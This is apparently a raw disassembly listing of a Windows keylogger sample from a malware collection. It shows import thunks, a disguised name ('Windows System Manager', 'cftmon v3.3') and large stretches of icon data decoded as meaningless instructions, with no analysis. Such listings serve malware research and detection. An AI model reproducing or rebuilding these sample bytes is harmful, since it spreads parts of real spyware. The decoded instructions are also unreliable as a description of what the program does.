
malware_samples/keylogger/748d991969a8a7d4da78abc9ec407a9e045ce2e97394350dc4b528565eca02b9.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	86 93 0f 66 f9 09    	xchg   %dl,0x9f9660f(%ebx)
  401006:	0f 66 29             	pcmpgtd (%ecx),%mm5
  401009:	19 0e                	sbb    %ecx,(%esi)
  40100b:	66 9b                	data16 fwait
  40100d:	6a 0e                	push   $0xe
  40100f:	66 62 72 10          	bound  %si,0x10(%edx)
  401013:	66 ba 02 0f          	mov    $0xf02,%dx
  401017:	66 c3                	retw
  401019:	9f                   	lahf
  40101a:	0d 66 41 09 0f       	or     $0xf094166,%eax
  40101f:	66 76 6a             	data16 jbe 0x40108c
  401022:	0e                   	push   %cs
  401023:	66 3a c3             	data16 cmp %bl,%al
  401026:	0c 66                	or     $0x66,%al
  401028:	74 a2                	je     0x400fcc
  40102a:	0d 66 6e 02 0f       	or     $0xf026e66,%eax
  40102f:	66 35 db 0d          	xor    $0xddb,%ax
  401033:	66 f1                	data16 int1
  401035:	9f                   	lahf
  401036:	0d 66 06 03 0f       	or     $0xf030666,%eax
  40103b:	66 06                	pushw  %es
  40103d:	04 0f                	add    $0xf,%al
  40103f:	66 ee                	data16 out %al,(%dx)
  401041:	94                   	xchg   %eax,%esp
  401042:	0f 66 ea             	pcmpgtd %mm2,%mm5
  401045:	62 0f                	bound  %ecx,(%edi)
  401047:	66 74 9b             	data16 je 0x400fe5
  40104a:	0c 66                	or     $0x66,%al
  40104c:	96                   	xchg   %eax,%esi
  40104d:	95                   	xchg   %eax,%ebp
  40104e:	0e                   	push   %cs
  40104f:	66 fd                	data16 std
  401051:	a0 00 66 f6 09       	mov    0x9f66600,%al
  401056:	0f 66 87 9b 0c 66 93 	pcmpgtd -0x6c99f365(%edi),%mm0
  40105d:	95                   	xchg   %eax,%ebp
  40105e:	0f 66 85 9a 0c 66 df 	pcmpgtd -0x2099f366(%ebp),%mm0
  401065:	47                   	inc    %edi
  401066:	0e                   	push   %cs
  401067:	66 89 06             	mov    %ax,(%esi)
  40106a:	0f 66 ba 03 0f 66 56 	pcmpgtd 0x56660f03(%edx),%mm7
  401071:	0f 0e                	femms
  401073:	66 13 75 10          	adc    0x10(%ebp),%si
  401077:	66 48                	dec    %ax
  401079:	19 0e                	sbb    %ecx,(%esi)
  40107b:	66 7d 69             	data16 jge 0x4010e7
  40107e:	0e                   	push   %cs
  40107f:	66 2b 94 0f 66 67 e8 	sub    0xce86766(%edi,%ecx,1),%dx
  401086:	0c 
  401087:	66 37                	data16 aaa
  401089:	a2 0d 66 3a 03       	mov    %al,0x33a660d
  40108e:	0f 66 3a             	pcmpgtd (%edx),%mm7
  401091:	04 0f                	add    $0xf,%al
  401093:	66 4a                	dec    %dx
  401095:	6c                   	insb   (%dx),%es:(%edi)
  401096:	0e                   	push   %cs
  401097:	66 e3 da             	data16 jecxz 0x401074
  40109a:	0d 66 01 6c 0e       	or     $0xe6c0166,%eax
  40109f:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  4010a1:	03 0f                	add    (%edi),%ecx
  4010a3:	66 a9 fd 0e          	test   $0xefd,%ax
  4010a7:	66 a4                	data16 movsb %ds:(%esi),%es:(%edi)
  4010a9:	35 00 66 f6 6d       	xor    $0x6df66600,%eax
  4010ae:	10 66 d7             	adc    %ah,-0x29(%esi)
  4010b1:	a3 00 66 c0 92       	mov    %eax,0x92c06600
  4010b6:	0f 66 30             	pcmpgtd (%eax),%mm6
  4010b9:	6c                   	insb   (%dx),%es:(%edi)
  4010ba:	0e                   	push   %cs
  4010bb:	66 ed                	in     (%dx),%ax
  4010bd:	ee                   	out    %al,(%dx)
  4010be:	0e                   	push   %cs
  4010bf:	66 44                	inc    %sp
  4010c1:	96                   	xchg   %eax,%esi
  4010c2:	0f 66 11             	pcmpgtd (%ecx),%mm2
  4010c5:	dd 0e                	fisttpll (%esi)
  4010c7:	66 af                	scas   %es:(%edi),%ax
  4010c9:	9f                   	lahf
  4010ca:	0d 66 ec 6b 0e       	or     $0xe6bec66,%eax
  4010cf:	66 00 00             	data16 add %al,(%eax)
  4010d2:	00 00                	add    %al,(%eax)
  4010d4:	00 00                	add    %al,(%eax)
  4010d6:	00 00                	add    %al,(%eax)
  4010d8:	05 00 08 00 40       	add    $0x40000800,%eax
  4010dd:	2d 40 00 00 00       	sub    $0x40,%eax
  4010e2:	00 00                	add    %al,(%eax)
  4010e4:	47                   	inc    %edi
  4010e5:	2d 40 00 05 00       	sub    $0x50040,%eax
  4010ea:	08 00                	or     %al,(%eax)
  4010ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4010ed:	30 40 00             	xor    %al,0x0(%eax)
  4010f0:	00 00                	add    %al,(%eax)
  4010f2:	00 00                	add    %al,(%eax)
  4010f4:	7e 30                	jle    0x401126
  4010f6:	40                   	inc    %eax
  4010f7:	00 05 00 08 00 f7    	add    %al,0xf7000800
  4010fd:	31 40 00             	xor    %eax,0x0(%eax)
  401100:	00 00                	add    %al,(%eax)
  401102:	00 00                	add    %al,(%eax)
  401104:	fe                   	(bad)
  401105:	31 40 00             	xor    %eax,0x0(%eax)
  401108:	05 00 08 00 d8       	add    $0xd8000800,%eax
  40110d:	60                   	pusha
  40110e:	40                   	inc    %eax
  40110f:	00 00                	add    %al,(%eax)
  401111:	00 00                	add    %al,(%eax)
  401113:	00 df                	add    %bl,%bh
  401115:	60                   	pusha
  401116:	40                   	inc    %eax
	...
  40111f:	00 ff                	add    %bh,%bh
  401121:	25 44 10 40 00       	and    $0x401044,%eax
  401126:	ff 25 64 10 40 00    	jmp    *0x401064
  40112c:	ff 25 74 10 40 00    	jmp    *0x401074
  401132:	ff 25 38 10 40 00    	jmp    *0x401038
  401138:	ff 25 2c 10 40 00    	jmp    *0x40102c
  40113e:	ff 25 8c 10 40 00    	jmp    *0x40108c
  401144:	ff 25 14 10 40 00    	jmp    *0x401014
  40114a:	ff 25 a4 10 40 00    	jmp    *0x4010a4
  401150:	ff 25 3c 10 40 00    	jmp    *0x40103c
  401156:	ff 25 a0 10 40 00    	jmp    *0x4010a0
  40115c:	ff 25 90 10 40 00    	jmp    *0x401090
  401162:	ff 25 6c 10 40 00    	jmp    *0x40106c
  401168:	ff 25 54 10 40 00    	jmp    *0x401054
  40116e:	ff 25 68 10 40 00    	jmp    *0x401068
  401174:	ff 25 1c 10 40 00    	jmp    *0x40101c
  40117a:	ff 25 04 10 40 00    	jmp    *0x401004
  401180:	ff 25 b4 10 40 00    	jmp    *0x4010b4
  401186:	ff 25 00 10 40 00    	jmp    *0x401000
  40118c:	ff 25 c4 10 40 00    	jmp    *0x4010c4
  401192:	ff 25 80 10 40 00    	jmp    *0x401080
  401198:	ff 25 40 10 40 00    	jmp    *0x401040
  40119e:	ff 25 5c 10 40 00    	jmp    *0x40105c
  4011a4:	ff 25 c0 10 40 00    	jmp    *0x4010c0
  4011aa:	ff 25 bc 10 40 00    	jmp    *0x4010bc
  4011b0:	ff 25 50 10 40 00    	jmp    *0x401050
  4011b6:	ff 25 84 10 40 00    	jmp    *0x401084
  4011bc:	ff 25 98 10 40 00    	jmp    *0x401098
  4011c2:	ff 25 70 10 40 00    	jmp    *0x401070
  4011c8:	ff 25 7c 10 40 00    	jmp    *0x40107c
  4011ce:	ff 25 78 10 40 00    	jmp    *0x401078
  4011d4:	ff 25 18 10 40 00    	jmp    *0x401018
  4011da:	ff 25 0c 10 40 00    	jmp    *0x40100c
  4011e0:	ff 25 20 10 40 00    	jmp    *0x401020
  4011e6:	ff 25 9c 10 40 00    	jmp    *0x40109c
  4011ec:	ff 25 24 10 40 00    	jmp    *0x401024
  4011f2:	ff 25 b0 10 40 00    	jmp    *0x4010b0
  4011f8:	ff 25 34 10 40 00    	jmp    *0x401034
  4011fe:	ff 25 4c 10 40 00    	jmp    *0x40104c
  401204:	ff 25 10 10 40 00    	jmp    *0x401010
  40120a:	ff 25 cc 10 40 00    	jmp    *0x4010cc
  401210:	ff 25 ac 10 40 00    	jmp    *0x4010ac
  401216:	ff 25 30 10 40 00    	jmp    *0x401030
  40121c:	ff 25 08 10 40 00    	jmp    *0x401008
  401222:	ff 25 b8 10 40 00    	jmp    *0x4010b8
  401228:	ff 25 94 10 40 00    	jmp    *0x401094
  40122e:	ff 25 c8 10 40 00    	jmp    *0x4010c8
  401234:	ff 25 28 10 40 00    	jmp    *0x401028
  40123a:	ff 25 88 10 40 00    	jmp    *0x401088
  401240:	ff 25 60 10 40 00    	jmp    *0x401060
  401246:	ff 25 48 10 40 00    	jmp    *0x401048
  40124c:	ff 25 58 10 40 00    	jmp    *0x401058
  401252:	ff 25 a8 10 40 00    	jmp    *0x4010a8
  401258:	68 ec 18 40 00       	push   $0x4018ec
  40125d:	e8 f0 ff ff ff       	call   0x401252
  401262:	00 00                	add    %al,(%eax)
  401264:	00 00                	add    %al,(%eax)
  401266:	00 00                	add    %al,(%eax)
  401268:	30 00                	xor    %al,(%eax)
  40126a:	00 00                	add    %al,(%eax)
  40126c:	50                   	push   %eax
  40126d:	00 00                	add    %al,(%eax)
  40126f:	00 38                	add    %bh,(%eax)
  401271:	00 00                	add    %al,(%eax)
  401273:	00 26                	add    %ah,(%esi)
  401275:	64 8c 7b fe          	mov    %?,%fs:-0x2(%ebx)
  401279:	0d aa 49 96 b7       	or     $0xb79649aa,%eax
  40127e:	05 f3 8f d9 92       	add    $0x92d98ff3,%eax
  401283:	1a 00                	sbb    (%eax),%al
  401285:	00 00                	add    %al,(%eax)
  401287:	00 00                	add    %al,(%eax)
  401289:	00 01                	add    %al,(%ecx)
  40128b:	00 00                	add    %al,(%eax)
  40128d:	00 74 69 6f          	add    %dh,0x6f(%ecx,%ebp,2)
  401291:	6e                   	outsb  %ds:(%esi),(%dx)
  401292:	54                   	push   %esp
  401293:	79 63                	jns    0x4012f8
  401295:	66 74 6d             	data16 je 0x401305
  401298:	6f                   	outsl  %ds:(%esi),(%dx)
  401299:	6e                   	outsb  %ds:(%esi),(%dx)
  40129a:	00 61 57             	add    %ah,0x57(%ecx)
  40129d:	69 6e 64 6f 77 73 20 	imul   $0x2073776f,0x64(%esi),%ebp
  4012a4:	53                   	push   %ebx
  4012a5:	79 73                	jns    0x40131a
  4012a7:	74 65                	je     0x40130e
  4012a9:	6d                   	insl   (%dx),%es:(%edi)
  4012aa:	20 4d 61             	and    %cl,0x61(%ebp)
  4012ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4012ae:	61                   	popa
  4012af:	67 65 72 00          	addr16 gs jb 0x4012b3
  4012b3:	64 00 00             	add    %al,%fs:(%eax)
  4012b6:	00 00                	add    %al,(%eax)
  4012b8:	ff cc                	dec    %esp
  4012ba:	31 00                	xor    %eax,(%eax)
  4012bc:	04 8d                	add    $0x8d,%al
  4012be:	06                   	push   %es
  4012bf:	21 56 8d             	and    %edx,-0x73(%esi)
  4012c2:	3c 35                	cmp    $0x35,%al
  4012c4:	4c                   	dec    %esp
  4012c5:	ab                   	stos   %eax,%es:(%edi)
  4012c6:	17                   	pop    %ss
  4012c7:	1f                   	pop    %ds
  4012c8:	43                   	inc    %ebx
  4012c9:	57                   	push   %edi
  4012ca:	56                   	push   %esi
  4012cb:	79 17                	jns    0x4012e4
  4012cd:	08 35 b4 a4 1d b6    	or     %dh,0xb61da4b4
  4012d3:	ce                   	into
  4012d4:	40                   	inc    %eax
  4012d5:	ac                   	lods   %ds:(%esi),%al
  4012d6:	52                   	push   %edx
  4012d7:	95                   	xchg   %eax,%ebp
  4012d8:	27                   	daa
  4012d9:	40                   	inc    %eax
  4012da:	b8 0c 45 3a 4f       	mov    $0x4f3a450c,%eax
  4012df:	ad                   	lods   %ds:(%esi),%eax
  4012e0:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  4012e6:	0c 00                	or     $0x0,%al
  4012e8:	aa                   	stos   %al,%es:(%edi)
  4012e9:	00 60 d3             	add    %ah,-0x2d(%eax)
  4012ec:	93                   	xchg   %eax,%ebx
	...
  401311:	40                   	inc    %eax
  401312:	05 00 00 8f 04       	add    $0x48f0000,%eax
  401317:	00 00                	add    %al,(%eax)
  401319:	00 07                	add    %al,(%edi)
  40131b:	00 66 72             	add    %ah,0x72(%esi)
  40131e:	6d                   	insl   (%dx),%es:(%edi)
  40131f:	4d                   	dec    %ebp
  401320:	61                   	popa
  401321:	69 6e 00 0d 01 0b 00 	imul   $0xb010d,0x0(%esi),%ebp
  401328:	63 66 74             	arpl   %esp,0x74(%esi)
  40132b:	6d                   	insl   (%dx),%es:(%edi)
  40132c:	6f                   	outsl  %ds:(%esi),(%dx)
  40132d:	6e                   	outsb  %ds:(%esi),(%dx)
  40132e:	20 76 33             	and    %dh,0x33(%esi)
  401331:	2e 33 00             	xor    %cs:(%eax),%eax
  401334:	03 00                	add    (%eax),%eax
  401336:	00 00                	add    %al,(%eax)
  401338:	00 19                	add    %bl,(%ecx)
  40133a:	01 00                	add    %eax,(%eax)
  40133c:	42                   	inc    %edx
  40133d:	00 22                	add    %ah,(%edx)
  40133f:	01 23                	add    %esp,(%ebx)
  401341:	3e 04 00             	ds add $0x0,%al
  401344:	00 6c 74 00          	add    %ch,0x0(%esp,%esi,2)
  401348:	00 36                	add    %dh,(%esi)
  40134a:	04 00                	add    $0x0,%al
  40134c:	00 00                	add    %al,(%eax)
  40134e:	00 01                	add    %al,(%ecx)
  401350:	00 02                	add    %al,(%edx)
  401352:	00 20                	add    %ah,(%eax)
  401354:	20 10                	and    %dl,(%eax)
  401356:	00 00                	add    %al,(%eax)
  401358:	00 00                	add    %al,(%eax)
  40135a:	00 e8                	add    %ch,%al
  40135c:	02 00                	add    (%eax),%al
  40135e:	00 26                	add    %ah,(%esi)
  401360:	00 00                	add    %al,(%eax)
  401362:	00 10                	add    %dl,(%eax)
  401364:	10 10                	adc    %dl,(%eax)
  401366:	00 00                	add    %al,(%eax)
  401368:	00 00                	add    %al,(%eax)
  40136a:	00 28                	add    %ch,(%eax)
  40136c:	01 00                	add    %eax,(%eax)
  40136e:	00 0e                	add    %cl,(%esi)
  401370:	03 00                	add    (%eax),%eax
  401372:	00 28                	add    %ch,(%eax)
  401374:	00 00                	add    %al,(%eax)
  401376:	00 20                	add    %ah,(%eax)
  401378:	00 00                	add    %al,(%eax)
  40137a:	00 40 00             	add    %al,0x0(%eax)
  40137d:	00 00                	add    %al,(%eax)
  40137f:	01 00                	add    %eax,(%eax)
  401381:	04 00                	add    $0x0,%al
  401383:	00 00                	add    %al,(%eax)
  401385:	00 00                	add    %al,(%eax)
  401387:	80 02 00             	addb   $0x0,(%edx)
	...
  40139e:	00 00                	add    %al,(%eax)
  4013a0:	00 80 00 00 80 00    	add    %al,0x800000(%eax)
  4013a6:	00 00                	add    %al,(%eax)
  4013a8:	80 80 00 80 00 00 00 	addb   $0x0,0x8000(%eax)
  4013af:	80 00 80             	addb   $0x80,(%eax)
  4013b2:	00 80 80 00 00 80    	add    %al,-0x7fffff80(%eax)
  4013b8:	80 80 00 c0 c0 c0 00 	addb   $0x0,-0x3f3f4000(%eax)
  4013bf:	00 00                	add    %al,(%eax)
  4013c1:	ff 00                	incl   (%eax)
  4013c3:	00 ff                	add    %bh,%bh
  4013c5:	00 00                	add    %al,(%eax)
  4013c7:	00 ff                	add    %bh,%bh
  4013c9:	ff 00                	incl   (%eax)
  4013cb:	ff 00                	incl   (%eax)
  4013cd:	00 00                	add    %al,(%eax)
  4013cf:	ff 00                	incl   (%eax)
  4013d1:	ff 00                	incl   (%eax)
  4013d3:	ff                   	(bad)
  4013d4:	ff 00                	incl   (%eax)
  4013d6:	00 ff                	add    %bh,%bh
  4013d8:	ff                   	(bad)
  4013d9:	ff 00                	incl   (%eax)
	...
  4013f3:	00 00                	add    %al,(%eax)
  4013f5:	00 04 ce             	add    %al,(%esi,%ecx,8)
  4013f8:	c0 00 00             	rolb   $0x0,(%eax)
	...
  401403:	00 00                	add    %al,(%eax)
  401405:	00 4c ee c0          	add    %cl,-0x40(%esi,%ebp,8)
	...
  401415:	04 ce                	add    $0xce,%al
  401417:	ec                   	in     (%dx),%al
  401418:	c0 00 00             	rolb   $0x0,(%eax)
	...
  401423:	00 00                	add    %al,(%eax)
  401425:	4c                   	dec    %esp
  401426:	ee                   	out    %al,(%dx)
  401427:	cc                   	int3
	...
  401434:	04 ce                	add    $0xce,%al
  401436:	ec                   	in     (%dx),%al
  401437:	c0 00 00             	rolb   $0x0,(%eax)
  40143a:	00 73 33             	add    %dh,0x33(%ebx)
  40143d:	33 33                	xor    (%ebx),%esi
  40143f:	33 33                	xor    (%ebx),%esi
  401441:	33 33                	xor    (%ebx),%esi
  401443:	33 4c ee cc          	xor    -0x34(%esi,%ebp,8),%ecx
  401447:	03 33                	add    (%ebx),%esi
  401449:	33 30                	xor    (%eax),%esi
  40144b:	7f b8                	jg     0x401405
  40144d:	b8 b8 b8 b8 b8       	mov    $0xb8b8b8b8,%eax
  401452:	b8 b4 ce ec c0       	mov    $0xc0ecceb4,%eax
  401457:	38 b8 b8 30 7f 8b    	cmp    %bh,-0x7480cf48(%eax)
  40145d:	8b 8b 8b 8b 8b 8b    	mov    -0x74747475(%ebx),%ecx
  401463:	7c ee                	jl     0x401453
  401465:	cc                   	int3
  401466:	03 8b 8b 8b 30 7f    	add    0x7f308b8b(%ebx),%ecx
  40146c:	b8 b8 b8 b8 b8       	mov    $0xb8b8b8b8,%eax
  401471:	b8 b7 8f ec c0       	mov    $0xc0ec8fb7,%eax
  401476:	38 b8 b8 b8 30 7f    	cmp    %bh,0x7f30b8b8(%eax)
  40147c:	8b 8b 8b 80 00 00    	mov    0x808b(%ebx),%ecx
  401482:	78 f8                	js     0x40147c
  401484:	7c 03                	jl     0x401489
  401486:	8b 8b 8b 8b 30 7f    	mov    0x7f308b8b(%ebx),%ecx
  40148c:	b8 b8 b0 06 66       	mov    $0x6606b0b8,%eax
  401491:	66 00 87 70 38 b8 b8 	data16 add %al,-0x4747c790(%edi)
  401498:	b8 b8 30 7f 8b       	mov    $0x8b7f30b8,%eax
  40149d:	8b 76 8e             	mov    -0x72(%esi),%esi
  4014a0:	8e 8e 66 07 03 8b    	mov    -0x74fcf89a(%esi),%cs
  4014a6:	8b 8b 8b 8b 30 7f    	mov    0x7f308b8b(%ebx),%ecx
  4014ac:	b8 b7 68 e8 e8       	mov    $0xe8e868b7,%eax
  4014b1:	e8 e6 60 38 b8       	call   0xb878759c
  4014b6:	b8 b8 b8 b8 30       	mov    $0x30b8b8b8,%eax
  4014bb:	7f 8b                	jg     0x401448
  4014bd:	87 8e fe 8e 8e 8e    	xchg   %ecx,-0x71717102(%esi)
  4014c3:	60                   	pusha
  4014c4:	78 8b                	js     0x401451
  4014c6:	8b 8b 8b 8b 30 7f    	mov    0x7f308b8b(%ebx),%ecx
  4014cc:	b8 78 ef e8 e8       	mov    $0xe8e8ef78,%eax
  4014d1:	e8 e8 e6 07 b8       	call   0xb847fbbe
  4014d6:	b8 b8 b8 b8 30       	mov    $0x30b8b8b8,%eax
  4014db:	7f 8b                	jg     0x401468
  4014dd:	7e fe                	jle    0x4014dd
  4014df:	fe 8e 8e 8e 86 03    	decb   0x3868e8e(%esi)
  4014e5:	8b 8b 8b 8b 8b 30    	mov    0x308b8b8b(%ebx),%ecx
  4014eb:	7f b8                	jg     0x4014a5
  4014ed:	78 ef                	js     0x4014de
  4014ef:	f8                   	clc
  4014f0:	e8 e8 e8 e6 07       	call   0x826fddd
  4014f5:	b8 b8 b8 b8 b8       	mov    $0xb8b8b8b8,%eax
  4014fa:	30 7f 8b             	xor    %bh,-0x75(%edi)
  4014fd:	7e fe                	jle    0x4014fd
  4014ff:	ff 8e 8e 8e 86 03    	decl   0x3868e8e(%esi)
  401505:	8b 8b 8b 8b 8b 30    	mov    0x308b8b8b(%ebx),%ecx
  40150b:	7f b8                	jg     0x4014c5
  40150d:	78 ef                	js     0x4014fe
  40150f:	ff                   	ljmp   (bad)
  401510:	e8 e8 e8 e6 07       	call   0x826fdfd
  401515:	b8 b8 b8 b8 b8       	mov    $0xb8b8b8b8,%eax
  40151a:	30 7f 8b             	xor    %bh,-0x75(%edi)
  40151d:	87 fe                	xchg   %edi,%esi
  40151f:	ff                   	(bad)
  401520:	fe 8e 8e 80 38 8b    	decb   -0x74c77f72(%esi)
  401526:	8b 8b 8b 8b 30 7f    	mov    0x7f308b8b(%ebx),%ecx
  40152c:	b8 b7 8f ef ef       	mov    $0xefef8fb7,%eax
  401531:	e8 e8 60 38 b8       	call   0xb878761e
  401536:	b8 b8 b8 b8 30       	mov    $0x30b8b8b8,%eax
  40153b:	7f 8b                	jg     0x4014c8
  40153d:	8b 78 fe             	mov    -0x2(%eax),%edi
  401540:	fe                   	(bad)
  401541:	fe 86 07 8b 8b 8b    	incb   -0x747474f9(%esi)
  401547:	8b 8b 8b 30 7f b8    	mov    -0x4780cf75(%ebx),%ecx
  40154d:	b8 b7 78 e8 e7       	mov    $0xe7e878b7,%eax
  401552:	00 78 b8             	add    %bh,-0x48(%eax)
  401555:	b8 b8 b8 b8 b8       	mov    $0xb8b8b8b8,%eax
  40155a:	30 7f 8b             	xor    %bh,-0x75(%edi)
  40155d:	8b 8b 87 77 70 33    	mov    0x33707787(%ebx),%ecx
  401563:	8b 8b 8b 8b 8b 8b    	mov    -0x74747475(%ebx),%ecx
  401569:	8b 30                	mov    (%eax),%esi
  40156b:	7f b8                	jg     0x401525
  40156d:	b8 b8 b8 b8 b8       	mov    $0xb8b8b8b8,%eax
  401572:	b8 b8 b8 b8 b8       	mov    $0xb8b8b8b8,%eax
  401577:	b8 b8 b8 30 7f       	mov    $0x7f30b8b8,%eax
  40157c:	ff                   	(bad)
  40157d:	ff                   	(bad)
  40157e:	ff                   	(bad)
  40157f:	ff                   	(bad)
  401580:	ff                   	(bad)
  401581:	ff                   	(bad)
  401582:	ff                   	(bad)
  401583:	ff                   	(bad)
  401584:	ff                   	(bad)
  401585:	ff                   	(bad)
  401586:	ff                   	(bad)
  401587:	ff                   	(bad)
  401588:	ff                   	(bad)
  401589:	ff 00                	incl   (%eax)
  40158b:	78 88                	js     0x401515
  40158d:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  401593:	77 77                	ja     0x40160c
  401595:	77 77                	ja     0x40160e
  401597:	77 77                	ja     0x401610
  401599:	77 00                	ja     0x40159b
  40159b:	07                   	pop    %es
  40159c:	fb                   	sti
  40159d:	8b 8b 8b 8b 8b 87    	mov    -0x78747475(%ebx),%ecx
	...
  4015ab:	00 7f b8             	add    %bh,-0x48(%edi)
  4015ae:	b8 b8 b8 b8 70       	mov    $0x70b8b8b8,%eax
	...
  4015bb:	00 07                	add    %al,(%edi)
  4015bd:	ff                   	(bad)
  4015be:	ff                   	(bad)
  4015bf:	ff                   	(bad)
  4015c0:	ff f7                	push   %edi
	...
  4015ca:	00 00                	add    %al,(%eax)
  4015cc:	00 77 77             	add    %dh,0x77(%edi)
  4015cf:	77 77                	ja     0x401648
  4015d1:	70 00                	jo     0x4015d3
	...
  4015db:	ff                   	(bad)
  4015dc:	ff                   	(bad)
  4015dd:	ff 1f                	lcall  *(%edi)
  4015df:	ff                   	(bad)
  4015e0:	ff                   	(bad)
  4015e1:	fe 0f                	decb   (%edi)
  4015e3:	ff                   	(bad)
  4015e4:	ff                   	(bad)
  4015e5:	fc                   	cld
  4015e6:	0f ff ff             	ud0    %edi,%edi
  4015e9:	f8                   	clc
  4015ea:	0f ff ff             	ud0    %edi,%edi
  4015ed:	f0 1f                	lock pop %ds
  4015ef:	80 00 00             	addb   $0x0,(%eax)
  4015f2:	01 00                	add    %eax,(%eax)
	...
  401644:	00 00                	add    %al,(%eax)
  401646:	01 00                	add    %eax,(%eax)
  401648:	00 00                	add    %al,(%eax)
  40164a:	03 80 00 ff ff c0    	add    -0x3f000100(%eax),%eax
  401650:	01 ff                	add    %edi,%edi
  401652:	ff e0                	jmp    *%eax
  401654:	03 ff                	add    %edi,%edi
  401656:	ff f0                	push   %eax
  401658:	07                   	pop    %es
  401659:	ff                   	(bad)
  40165a:	ff 28                	ljmp   *(%eax)
  40165c:	00 00                	add    %al,(%eax)
  40165e:	00 10                	add    %dl,(%eax)
  401660:	00 00                	add    %al,(%eax)
  401662:	00 20                	add    %ah,(%eax)
  401664:	00 00                	add    %al,(%eax)
  401666:	00 01                	add    %al,(%ecx)
  401668:	00 04 00             	add    %al,(%eax,%eax,1)
  40166b:	00 00                	add    %al,(%eax)
  40166d:	00 00                	add    %al,(%eax)
  40166f:	c0 00 00             	rolb   $0x0,(%eax)
	...
  401686:	00 00                	add    %al,(%eax)
  401688:	00 80 00 00 80 00    	add    %al,0x800000(%eax)
  40168e:	00 00                	add    %al,(%eax)
  401690:	80 80 00 80 00 00 00 	addb   $0x0,0x8000(%eax)
  401697:	80 00 80             	addb   $0x80,(%eax)
  40169a:	00 80 80 00 00 80    	add    %al,-0x7fffff80(%eax)
  4016a0:	80 80 00 c0 c0 c0 00 	addb   $0x0,-0x3f3f4000(%eax)
  4016a7:	00 00                	add    %al,(%eax)
  4016a9:	ff 00                	incl   (%eax)
  4016ab:	00 ff                	add    %bh,%bh
  4016ad:	00 00                	add    %al,(%eax)
  4016af:	00 ff                	add    %bh,%bh
  4016b1:	ff 00                	incl   (%eax)
  4016b3:	ff 00                	incl   (%eax)
  4016b5:	00 00                	add    %al,(%eax)
  4016b7:	ff 00                	incl   (%eax)
  4016b9:	ff 00                	incl   (%eax)
  4016bb:	ff                   	(bad)
  4016bc:	ff 00                	incl   (%eax)
  4016be:	00 ff                	add    %bh,%bh
  4016c0:	ff                   	(bad)
  4016c1:	ff 00                	incl   (%eax)
	...
  4016cf:	00 04 ec             	add    %al,(%esp,%ebp,8)
  4016d2:	00 00                	add    %al,(%eax)
  4016d4:	00 00                	add    %al,(%eax)
  4016d6:	00 00                	add    %al,(%eax)
  4016d8:	4e                   	dec    %esi
  4016d9:	cc                   	int3
  4016da:	00 00                	add    %al,(%eax)
  4016dc:	00 00                	add    %al,(%eax)
  4016de:	00 04 ec             	add    %al,(%esp,%ebp,8)
  4016e1:	c0 00 73             	rolb   $0x73,(%eax)
  4016e4:	33 33                	xor    (%ebx),%esi
  4016e6:	33 4e cc             	xor    -0x34(%esi),%ecx
  4016e9:	33 00                	xor    (%eax),%eax
  4016eb:	7f b8                	jg     0x4016a5
  4016ed:	70 07                	jo     0x4016f6
  4016ef:	8c c3                	mov    %es,%ebx
  4016f1:	b3 00                	mov    $0x0,%bl
  4016f3:	7f 87                	jg     0x40167c
  4016f5:	8e 80 73 3b 83 00    	mov    0x833b73(%eax),%es
  4016fb:	7f 7f                	jg     0x40177c
  4016fd:	e8 e8 03 b8 b3       	call   0xb3f81aea
  401702:	00 7f 7e             	add    %bh,0x7e(%edi)
  401705:	fe 8e 03 8b 83 00    	decb   0x838b03(%esi)
  40170b:	7f 7f                	jg     0x40178c
  40170d:	ef                   	out    %eax,(%dx)
  40170e:	e8 07 b8 b3 00       	call   0xf3cf1a
  401713:	7f 87                	jg     0x40169c
  401715:	fe                   	(bad)
  401716:	f0 7b 8b             	lock jnp 0x4016a4
  401719:	83 00 7f             	addl   $0x7f,(%eax)
  40171c:	b8 77 07 b8 b8       	mov    $0xb8b80777,%eax
  401721:	b3 00                	mov    $0x0,%bl
  401723:	7f ff                	jg     0x401724
  401725:	ff                   	(bad)
  401726:	ff                   	(bad)
  401727:	ff                   	(bad)
  401728:	ff f3                	push   %ebx
  40172a:	00 78 b8             	add    %bh,-0x48(%eax)
  40172d:	b8 b8 77 77 77       	mov    $0x777777b8,%eax
  401732:	00 07                	add    %al,(%edi)
  401734:	8b 8b 87 00 00 00    	mov    0x87(%ebx),%ecx
  40173a:	00 00                	add    %al,(%eax)
  40173c:	77 77                	ja     0x4017b5
  40173e:	70 00                	jo     0x401740
  401740:	00 00                	add    %al,(%eax)
  401742:	00 ff                	add    %bh,%bh
  401744:	f3 00 00             	repz add %al,(%eax)
  401747:	ff e1                	jmp    *%ecx
  401749:	00 00                	add    %al,(%eax)
  40174b:	ff c1                	inc    %ecx
  40174d:	00 00                	add    %al,(%eax)
  40174f:	80 03 00             	addb   $0x0,(%ebx)
  401752:	00 00                	add    %al,(%eax)
  401754:	01 00                	add    %eax,(%eax)
  401756:	00 00                	add    %al,(%eax)
  401758:	01 00                	add    %eax,(%eax)
  40175a:	00 00                	add    %al,(%eax)
  40175c:	01 00                	add    %eax,(%eax)
  40175e:	00 00                	add    %al,(%eax)
  401760:	01 00                	add    %eax,(%eax)
  401762:	00 00                	add    %al,(%eax)
  401764:	01 00                	add    %eax,(%eax)
  401766:	00 00                	add    %al,(%eax)
  401768:	01 00                	add    %eax,(%eax)
  40176a:	00 00                	add    %al,(%eax)
  40176c:	01 00                	add    %eax,(%eax)
  40176e:	00 00                	add    %al,(%eax)
  401770:	01 00                	add    %eax,(%eax)
  401772:	00 00                	add    %al,(%eax)
  401774:	01 00                	add    %eax,(%eax)
  401776:	00 00                	add    %al,(%eax)
  401778:	03 00                	add    (%eax),%eax
  40177a:	00 80 ff 00 00 c1    	add    %al,-0x3effff01(%eax)
  401780:	ff 00                	incl   (%eax)
  401782:	00 24 05 00 46 6f 72 	add    %ah,0x726f4600(,%eax,1)
  401789:	6d                   	insl   (%dx),%es:(%edi)
  40178a:	31 00                	xor    %eax,(%eax)
  40178c:	26 00 2e             	add    %ch,%es:(%esi)
  40178f:	00 35 2d 00 00 00    	add    %dh,0x2d
  401795:	b3 01                	mov    $0x1,%bl
  401797:	00 00                	add    %al,(%eax)
  401799:	56                   	push   %esi
  40179a:	13 00                	adc    (%eax),%eax
